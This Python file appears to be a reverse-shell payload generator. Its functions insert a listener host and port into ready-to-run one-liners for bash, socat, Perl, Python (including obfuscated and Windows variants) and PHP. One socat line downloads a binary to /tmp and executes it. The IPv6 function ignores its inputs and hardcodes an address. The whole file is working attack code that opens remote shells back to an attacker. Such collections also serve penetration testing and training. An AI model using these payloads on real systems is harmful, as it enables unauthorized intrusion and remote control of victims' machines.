def push_payload(lhost,lport,payload):

    payload = payload.replace("{lhost}",lhost)
    payload = payload.replace("{lport}",lport)

    print(payload)



def BashTcp(lhost,lport):

    payload = """
    
    bash -c'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    
    bash -i >& /dev/tcp/{lhost}/{lport} 0>&1

    0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196

    /bin/bash -l > /dev/tcp/{lhost}/{lport} 0<&1 2>&1
    """
    push_payload(lhost,lport,payload)


def BashUDP(lhost,lport):

    payload = """

    Victim:
    sh -i >& /dev/udp/{lhost}/{lport} 0>&1

    Listener:
    nc -u -lvp {lport}
    """
    push_payload(lhost,lport,payload)


def Socat(lhost,lport):

    payload = """

    Attacker:
    socat file:`tty`,raw,echo=0 TCP-L:{lport}
    
    Victim:
    /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}
    
    wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}
    """
    push_payload(lhost,lport,payload)

def Perl(lhost,lport):

    payload = """
    
    perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


    NOTE: Windows only
    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    """
    push_payload(lhost,lport,payload)
    
def Python_ipv4_linux_only(lhost,lport):

    payload = """
    export RHOST="{lhost}";export RPORT={lport};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    
    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
    
    python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
    """
    push_payload(lhost,lport,payload)


def Python_ipv4_linux_only_no_space(lhost,lport):

    payload = """
    python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

    python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
    
    python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

    python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("{lhost}",{lport}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'

    python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("{lhost}",{lport}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'

    python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("{lhost}",{lport}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'

    python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("{lhost}",{lport}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'

    python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("{lhost}",{lport}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'

    python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("{lhost}",{lport}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
    """
    push_payload(lhost,lport,payload)

def Python_ipv6_linux_only(lhost,lport):
    payload = """
    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    
    python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

    python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
    """
    push_payload(lhost,lport,payload)

def Python_Windows_Only(lhost,lport):

    payload = """
    C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{lhost}', {lport})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\windows\\\system32\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"


    """
    push_payload(lhost,lport,payload)

def php(lhost,lport):

    payload = """
    php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});`/bin/sh -i <&3 >&3 2>&3`;'
    
    php -r '$sock=fsockopen("{lhost}",{lport});system("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});passthru("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});popen("/bin/sh -i <&3 >&3 2>&3", "r");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
    """
    push_payload(lhost,lport,payload)


